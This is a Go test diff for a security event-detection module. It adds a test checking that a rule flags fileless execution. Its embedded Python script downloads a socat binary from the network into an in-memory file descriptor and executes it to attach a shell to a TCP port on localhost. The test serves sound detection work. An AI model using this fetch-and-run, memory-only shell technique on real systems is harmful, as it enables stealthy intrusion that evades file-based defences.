@@ -1855,3 +1855,82 @@ func TestProcessResolution(t *testing.T) {
 		io.WriteString(stdin, "\n")
 	})
 }
+
+func TestProcessFilelessExecution(t *testing.T) {
+	python, whichPythonErr := whichNonFatal("python")
+	if whichPythonErr != nil {
+		python = which(t, "python3")
+	}
+
+	tests := []struct {
+		name    string
+		rule    *rules.RuleDefinition
+		command string
+		check   func(event *sprobe.Event, rule *rules.Rule)
+	}{
+		{
+			name: "fileless",
+			rule: &rules.RuleDefinition{
+				ID:         "test_fileless",
+				Expression: `exec.file.name == "memfd:"`,
+			},
+			command: fmt.Sprintf(`#!/bin/bash
+
+%s <<__HERE__
+#!%s
+
+import os
+from urllib.request import urlopen
+
+fd = os.memfd_create("", os.MFD_CLOEXEC);f2=open("/proc/self/fd/"+str(fd), "wb")
+f1=urlopen("https://github.com/3ndG4me/socat/releases/download/v1.7.3.3/socatx64.bin").read()
+f2.write(f1)
+f2.close()
+os.execv("/proc/self/fd/"+str(fd), ["kittens", "TCP:127.0.0.1:4242", "EXEC:sh"])
+__HERE__
+
+echo "end of fileless test script"`, python, python),
+			check: func(event *sprobe.Event, rule *rules.Rule) {
+				assertFieldEqual(t, event, "exec.file.name", "memfd:")
+			},
+		},
+	}
+
+	var ruleList []*rules.RuleDefinition
+	for _, test := range tests {
+		ruleList = append(ruleList, test.rule)
+	}
+
+	testModule, err := newTestModule(t, nil, ruleList, testOpts{})
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer testModule.Close()
+
+	for _, test := range tests {
+		t.Run(test.name, func(t *testing.T) {
+			scriptLocation := fmt.Sprintf("/tmp/%s", "filelessScript")
+			if scriptWriteErr := os.WriteFile(scriptLocation, []byte(test.command), 0755); scriptWriteErr != nil {
+				t.Fatalf("could not write %s: %s", scriptLocation, scriptWriteErr)
+			}
+			defer os.Remove(scriptLocation)
+
+			testModule.WaitSignal(t, func() error {
+				// Running exec.Command(python, ...) does not pass this test, despite the stdout/stderr being as expected.
+				// I think it's because the Python fileless test script runs but doesn't succeed, so somehow Go swallows the execution event?
+				cmd := exec.Command(scriptLocation)
+				_, scriptRunErr := cmd.CombinedOutput()
+				if scriptRunErr != nil {
+					t.Errorf("could not run %s: %s", scriptLocation, scriptRunErr)
+				}
+
+				return nil
+			}, func(event *sprobe.Event, rule *rules.Rule) {
+				assertTriggeredRule(t, rule, test.rule.ID)
+				if test.check != nil {
+					test.check(event, rule)
+				}
+			})
+		})
+	}
+}
